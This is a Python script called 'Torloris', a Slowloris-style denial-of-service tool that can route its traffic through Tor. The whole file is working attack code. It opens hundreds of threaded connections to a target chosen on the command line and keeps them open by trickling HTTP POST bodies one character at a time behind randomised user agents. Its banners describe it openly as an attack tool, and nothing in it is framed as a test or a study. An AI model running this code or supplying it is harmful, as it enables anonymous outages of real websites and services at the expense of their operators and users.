import time
import sys
import random
import pyfiglet
from colorama import init
from colorama import Fore, Back, Style
import getopt
import os
import socks
import string
init(convert=True)
from threading import Thread

global stop_now
global term
ThreadCount = 0
MaxThreads = 256
stop_now = False

useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
 "Googlebot/2.1 (https://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; https://help.yahoo.com/help/us/ysearch/slurp)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +https://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; https://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; https://help.yahoo.com/help/us/shop/merchant/)"
]


class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True

    def _send_http_post(self, pause=10):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print("Sending POST Requests: %s" % p)
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))


    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
                        time.sleep(1)
                    self.socks.connect((self.host, self.port))
                    global ThreadCount
                    ThreadCount += 1
                    if(ThreadCount == MaxThreads):
                        os.system('cls' if os.name == 'nt' else 'clear')
                        ascii_banner = pyfiglet.figlet_format("Torloris")
                        print(Fore.GREEN + ascii_banner)
                        print(Fore.MAGENTA , "Slowloris attack over TOR -Created by Nemesis0U \n \n")
                        print(Fore.LIGHTWHITE_EX)
                        print("\n")
                        print("~Attacking to the host , Thread Count: " , ThreadCount)
                        print("\n\nReached to the thread limit! Holding the connections...")
                    break
                except Exception as e:
                    print("Error connecting to the host!")
                    print(e)
                    time.sleep(1)
                    sys.exit()

            while self.running:
                try:
                    self._send_http_post()
                except Exception as e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print("Threads are broken, restarting!")
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass


def usage():
    print("Usage: python torloris.py -t <target> [-r <threads> -p <port> -T -h]\n")
    print("Example: python torloris.py -t 192.168.1.1 -r 256 -p 80\n")
    print(" -t|--target <Hostname or IP Address>")
    print(" -r|--threads <Number of threads> Default: 256")
    print(" -p|--port <Server Port> Default: 80")
    print(" -h|--help\n\n")


def main(argv):
    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    threads = 256
    tor = False
    port = 80

    for o, a in opts:
        tor = True
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_banner = pyfiglet.figlet_format("Torloris")
    print(Fore.GREEN + ascii_banner)
    print(Fore.MAGENTA , "Slowloris attack over TOR -Created by Nemesis0U \n \n")
    print(Fore.LIGHTWHITE_EX)
    print("\n")
    print("~Attacking to the host\n\n")
    print("Target: %s" % (target))
    print("Port: ",port)
    if(tor == True):
        print("Maximum Threads: %d \nTor Connection: Established" % (threads))
    else:
        print("Maximum Threads: %d \nTor Connection: Not Connected" % (threads))
    global MaxThreads
    MaxThreads = threads

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.is_alive()]
        except KeyboardInterrupt:
            print("\nStopping the attack...\n")
            for t in rthreads:
                stop_now = True
                t.running = False
            print("\nAttack has been stopped.\n")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_banner = pyfiglet.figlet_format("Torloris")
    print(Fore.GREEN + ascii_banner)
    print(Fore.MAGENTA , "Slowloris attack over TOR -Created by Nemesis0U \n \n")
    print(Fore.LIGHTWHITE_EX)

    main(sys.argv[1:])
